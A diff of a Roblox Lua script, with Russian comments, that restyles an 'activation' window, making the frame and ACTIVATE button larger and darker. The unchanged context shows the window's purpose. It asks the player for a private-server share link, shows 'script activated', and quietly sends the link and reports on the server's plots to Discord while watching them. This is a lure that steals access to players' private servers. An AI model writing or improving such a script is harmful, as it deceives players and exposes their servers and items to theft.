@@ -251,18 +251,14 @@ local function createActivationGUI()
 
 	local mainFrame = Instance.new("Frame")
 	mainFrame.Name = "MainFrame"
-	mainFrame.Size = UDim2.new(0, 420, 0, 260)
-	mainFrame.Position = UDim2.new(0.5, -210, 0.5, -130)
-	mainFrame.BackgroundColor3 = Color3.fromRGB(25, 25, 25)
+	mainFrame.Size = UDim2.new(0, 450, 0, 300) -- квадратное и больше для кнопки
+	mainFrame.Position = UDim2.new(0.5, -225, 0.5, -150)
+	mainFrame.BackgroundColor3 = Color3.fromRGB(0, 0, 0) -- черное
 	mainFrame.BorderSizePixel = 0
 	mainFrame.Parent = gui
 
-	local corner = Instance.new("UICorner")
-	corner.CornerRadius = UDim.new(0, 12)
-	corner.Parent = mainFrame
-
 	local title = Instance.new("TextLabel")
-	title.Size = UDim2.new(1, -20, 0, 40)
+	title.Size = UDim2.new(1, -20, 0, 50)
 	title.Position = UDim2.new(0, 10, 0, 10)
 	title.BackgroundTransparency = 1
 	title.Text = "Введите VIP ссылку для активации"
@@ -272,8 +268,8 @@ local function createActivationGUI()
 	title.Parent = mainFrame
 
 	local textBox = Instance.new("TextBox")
-	textBox.Size = UDim2.new(1, -20, 0, 40)
-	textBox.Position = UDim2.new(0, 10, 0, 60)
+	textBox.Size = UDim2.new(1, -20, 0, 50)
+	textBox.Position = UDim2.new(0, 10, 0, 70)
 	textBox.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
 	textBox.BorderSizePixel = 0
 	textBox.PlaceholderText = "https://www.roblox.com/share?code=..."
@@ -283,14 +279,10 @@ local function createActivationGUI()
 	textBox.Font = Enum.Font.Gotham
 	textBox.Parent = mainFrame
 
-	local textBoxCorner = Instance.new("UICorner")
-	textBoxCorner.CornerRadius = UDim.new(0, 8)
-	textBoxCorner.Parent = textBox
-
 	local button = Instance.new("TextButton")
-	button.Size = UDim2.new(1, -20, 0, 50)
-	button.Position = UDim2.new(0, 10, 0, 120)
-	button.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
+	button.Size = UDim2.new(1, -20, 0, 70) -- большая кнопка
+	button.Position = UDim2.new(0, 10, 0, 140)
+	button.BackgroundColor3 = Color3.fromRGB(0, 100, 255) -- ярко-синяя
 	button.BorderSizePixel = 0
 	button.Text = "ACTIVATE"
 	button.TextColor3 = Color3.new(1, 1, 1)
@@ -298,20 +290,16 @@ local function createActivationGUI()
 	button.Font = Enum.Font.GothamBold
 	button.Parent = mainFrame
 
-	local buttonCorner = Instance.new("UICorner")
-	buttonCorner.CornerRadius = UDim.new(0, 8)
-	buttonCorner.Parent = button
-
 	button.MouseEnter:Connect(function()
 		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 150, 255)}):Play()
 	end)
 	button.MouseLeave:Connect(function()
-		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 120, 255)}):Play()
+		TweenService:Create(button, TweenInfo.new(0.2), {BackgroundColor3 = Color3.fromRGB(0, 100, 255)}):Play()
 	end)
 
 	local status = Instance.new("TextLabel")
 	status.Size = UDim2.new(1, -20, 0, 30)
-	status.Position = UDim2.new(0, 10, 0, 190)
+	status.Position = UDim2.new(0, 10, 0, 220)
 	status.BackgroundTransparency = 1
 	status.Text = ""
 	status.TextColor3 = Color3.fromRGB(255, 200, 0)
@@ -332,14 +320,11 @@ local function createActivationGUI()
 		status.Text = "Скрипт активирован!"
 		status.TextColor3 = Color3.fromRGB(0, 255, 100)
 
-		-- Отправляем ссылку один раз
 		postDiscordSimple("🔗 VIP Link: " .. vipLink)
 
-		-- Первый отчёт
 		task.wait(1)
 		postCombinedAllPlots()
 
-		-- Мониторинг
 		watchPlots()
 
 		task.wait(2)
